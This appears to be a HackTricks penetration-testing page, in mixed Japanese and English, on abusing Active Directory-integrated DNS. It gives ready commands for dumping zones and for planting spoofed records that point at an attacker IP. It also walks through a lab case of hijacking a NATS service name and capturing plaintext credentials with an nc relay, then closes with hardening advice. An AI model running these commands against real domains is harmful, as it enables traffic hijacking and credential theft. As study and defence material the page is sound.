# AD DNSレコード

{{#include ../../banners/hacktricks-training.md}}

デフォルトでは、Active Directoryの**any user**が、DomainまたはForestのDNS zonesにある**all DNS records**を、zone transferと同様に**enumerate**できます（AD環境では、ユーザーはDNS zoneのchild objectsをlistできます）。

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)は、内部ネットワークのreconを目的として、zone内の**all DNS records**の**enumeration**および**exporting**を可能にします。<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) は、JSON/Greppable（`--json`）出力、マルチスレッド DNS resolution、および LDAPS への bind 時の TLS 1.2/1.3 サポートを追加します

詳細については [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup> を参照してください。

---

## レコードの作成 / 変更（ADIDNS spoofing）

**Authenticated Users** グループはデフォルトで zone DACL に **Create Child** 権限を持っているため、任意の domain account（または computer account）が追加のレコードを登録できます。これは traffic hijacking、NTLM relay coercion、さらには domain の完全な compromise に利用できます。

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py は Impacket ≥0.12.0 に同梱されています)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Common attack primitives

1. **Wildcard record** – `*.<zone>` は AD DNS server を LLMNR/NBNS spoofing に似た enterprise-wide responder に変える。これを悪用して NTLM hashes を取得したり、LDAP/SMB に relay したりできる。（WINS-lookup の無効化が必要。）<sup>[[1]](#references)</sup>
2. **WPAD hijack** – `wpad` を追加する（または Global-Query-Block-List を回避するため、attacker host を指す **NS** record を追加する）ことで、外向きの HTTP requests を透過的に proxy し、credentials を収集する。Microsoft は wildcard/DNAME bypasses（CVE-2018-8320）に patch を適用したが、**NS-records は引き続き機能する**。<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – 以前 workstation が使用していた IP address を取得すると、関連付けられた DNS entry は引き続き解決されるため、DNS に一切触れることなく resource-based constrained delegation や Shadow-Credentials attacks を可能にする。
4. **DHCP → DNS spoofing** – default の Windows DHCP+DNS deployment では、同一 subnet 上の unauthenticated attacker が、dynamic DNS updates を引き起こす偽造 DHCP requests を送信することで、既存の A record（Domain Controllers を含む）を上書きできる（Akamai の「DDSpoof」、2023）。これにより Kerberos/LDAP に対する machine-in-the-middle が可能になり、最終的に domain takeover につながる可能性がある。<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – 管理下にある machine account の `dNSHostName` を変更し、一致する A record を登録してから、その name の certificate を request することで、DC になりすます。**Certipy** や **BloodyAD** などの tools がこの flow を完全に自動化する。

---

### Stale dynamic records を介した Internal service hijacking（NATS case study）

dynamic updates がすべての authenticated users に対して open のままだと、**登録解除された service name を再取得し、attacker infrastructure を指すように設定できる**。Mirage HTB DC では DNS scavenging 後も hostname `nats-svc.mirage.htb` が公開されていたため、low-privileged user であれば誰でも次の操作が可能だった。<sup>[[3]](#references)</sup>

1. `dig` で **record が存在しないことを確認し**、SOA を取得する。
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **管理下にある外部/VPNインターフェース向けにレコードを再作成する**:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **plaintext serviceを偽装する**。NATSクライアントは認証情報を送信する前に1つの`INFO { ... }`バナーを受け取ることを想定しているため、実際のbrokerから正規のバナーをコピーするだけでsecretを収集できます:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Attacker host で公式の `nats-server -V` binary を実行する、log redaction を無効化する、または Wireshark でセッションを sniff するだけで、同じ plaintext credentials を取得できる。これは TLS が optional だったためである。

4. **captured creds で Pivot する** – Mirage では、盗まれた NATS account によって JetStream への access が提供され、再利用可能な AD usernames/passwords を含む過去の authentication events が露出した。

この pattern は、unsecured TCP handshakes に依存するすべての AD-integrated service（HTTP APIs、RPC、MQTT など）に適用される。DNS record が hijacked されると、attacker はその service になる。

---

## Detection & hardening

* Sensitive zones では **Authenticated Users** に *Create all child objects* right を deny し、dynamic updates を DHCP が使用する dedicated account に delegate する。
* Dynamic updates が必要な場合は、zone を **Secure-only** に設定し、DHCP で **Name Protection** を有効にして、owner computer object のみが自身の record を overwrite できるようにする。
* DNS Server event IDs 257/252（dynamic update）、770（zone transfer）、および `CN=MicrosoftDNS,DC=DomainDnsZones` への LDAP writes を monitor する。
* 危険な names（`wpad`、`isatap`、`*`）を intentionally-benign record または Global Query Block List によって block する。
* DNS servers に patch を適用した状態に保つ – 例として、RCE bugs の CVE-2024-26224 と CVE-2024-26231 は **CVSS 9.8** に達しており、Domain Controllers に対して remotely exploitable である。

## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/)（2018 年。wildcard/WPAD attacks に関する現在も de-facto reference）
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp)（2023 年 12 月）
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
